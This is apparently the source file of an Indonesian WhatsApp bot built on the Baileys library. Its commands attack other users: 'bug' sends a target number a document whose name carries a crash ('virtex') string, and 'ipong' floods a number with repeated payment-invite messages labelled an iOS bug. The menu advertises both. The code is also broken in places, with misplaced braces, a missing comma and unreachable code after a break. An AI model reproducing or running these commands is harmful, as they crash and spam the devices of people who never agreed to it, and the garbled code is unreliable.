require('./config');
const { makeWASocket, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, useMultiFileAuthState, templateMessage } = global.baileys1
const { smsg, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, await, sleep, reSize } = require('./storage')
const axios = require('axios')
const os = require('os')
const fs = require('fs')
const util = require('util')
const fetch = require('node-fetch')
const moment = require('moment-timezone')
const { spawn: spawn, exec } = require('child_process')
const { Primbon } = require('scrape-primbon')

// Base
module.exports = OzzyDev = async (OzzyDev, m, chatUpdate, store ) => {
try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "Tanpa Nama"
const text = q = args.join(" ")
const fatkuns = (m.quoted || m)
const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)

//User
var isAuthor = global.owner.replace(/[^0-9]/g, '').includes(m.sender.split("@")[0])
const botNumber = await OzzyDev.decodeJid(OzzyDev.user.id)
const globalelit = `${global.owner}@s.whatsapp.net`
const isOwner = globalelit.includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
}

// Virtex Bug
const { ozzyipong } = require('./lib/virtex/ozzyipong.js')
const { ozzybug } = require('./lib/virtex/ozzy1.js')

// Ozzy function
const replyozzy = (teks) => {
OzzyDev.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`.lib/thumb/Ozzy.jpg`),
"sourceUrl": `${link}`}}},
{ quoted: m})
}
async function OzzyCrash(dgozzy, chat) {
OzzyDev.sendMessage(chat, {
  document: {url: './settings.js'},
  mimetype: `image/null`,
  fileName: `${dgozzy}.${ozzybug}`,
  caption: `${dgozzy + ozzybug}`,
}, {
  quoted: sub_dgozzy
})
}

// Status
if (!OzzyDev.public) {
if (!m.key.fromMe) return
}

switch (command) {
case "bug":{
  if(!args[0]) return replyozzy(`Gunakan: ${prefix+command} <nomor>\nContoh: ${prefix+command} 085712345678`)
  victim = text.split("|")[0]+'@s.whatsapp.net'
  OzzyCrash(pushname, victim)
  await sleep(4000)
  replyozzy(`Sukses BUG ${victim} Gunakan BUG Lagi Setelah 5 Menit!!`)
}
break
case "ipong":{
  if(!text) return replyozzy(`Gunakan: ${prefix+command} <nomor|jumlah>\nContoh: ${prefix+command} 085712345678|30`)
  victim = text.split("|")[0]+'@s.whatsapp.net'
  amount = text.split("|")[1] * 30
  for (let i = 0; i < amount; i++) {
  await OzzyDev.relayMessage(victim, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
  await sleep(1400)
  }
  replyozzy(`Sukses BUG IOS ${victim} Gunakan BUG Lagi Setelah 15 Menit!!!!`)
}
case "menu":
let xangmenu = `
𐋄𐌀𐌍ᏵᏝ𐌉𐌍Ᏽ ᕓᛑ
▬▬▬▬▬▬▬▬▬▬▬▬▬
• 𝙷𝚊𝚕𝚘, 𝚑𝚊𝚛𝚊𝚙 𝚐𝚞𝚗𝚊𝚔𝚊𝚗 𝚋𝚘𝚝 𝚒𝚗𝚒 𝚍𝚎𝚗𝚐𝚊𝚗 𝚋𝚊𝚒𝚔
• 𝙱𝚘𝚝 𝙱𝚈 𝙾𝚣𝚣𝚢𝚂𝚊𝚗𝚣𝚣𝚣
▬▬▬▬▬▬▬▬▬▬▬▬▬
[ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚂𝙸 ]
➢ Waktu berjalan : ${runtime(process.uptime())}
➢ Pengguna : ${pushname}
▬▬▬▬▬▬▬▬▬▬▬▬▬
𝙼𝙴𝙽𝚄 𝙱𝚄𝙶:
➢ .i𝚙𝚘𝚗𝚐 <nomor>|<jumlah>
➢ .𝚋𝚞𝚐 <nomor>
▬▬▬▬▬▬▬▬▬▬▬▬▬
𝙼𝙴𝙽𝚄 𝙻𝙰𝙸𝙽:
➢ .𝚖𝚞𝚕𝚊𝚒𝚞𝚕𝚊𝚗𝚐
➢ .𝚖𝚊𝚝𝚒𝚔𝚊𝚗`
break
OzzyDev.sendMessage(m.chat {
  text: xangmenu,
  contextInfo: {
    externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: '',
      sourceUrl: link,
      mediaType: 1,
      rennderLargerThumbnail: true
    }
  }, {
    quoted: m
  }
})
} catch (err) {
        OzzyDev.sendText(ownernumber + '@s.whatsapp.net', util.format(err), m)
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
}